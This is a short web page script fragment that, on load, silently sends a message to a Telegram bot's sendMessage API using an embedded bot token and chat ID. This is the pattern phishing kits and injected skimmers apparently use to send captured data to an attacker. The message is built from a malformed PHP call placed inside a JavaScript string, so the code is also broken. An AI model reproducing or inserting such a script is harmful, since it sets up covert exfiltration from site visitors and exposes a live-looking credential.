<script>

function loadXMLDoc() {
 var msg="<?php mysqli_real_escape_string(); ?>";
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
    	var obj = JSON.parse(this.responseText);
    }
  };
  xhttp.open("GET", "https://api.telegram.org/bot1836503539:AAHMPJVUkVG_p4iA08pDDtBu8szny2cjHYg/sendMessage?chat_id=-571558132&text="+msg+"", true);
  xhttp.send();
}
loadXMLDoc();
</script>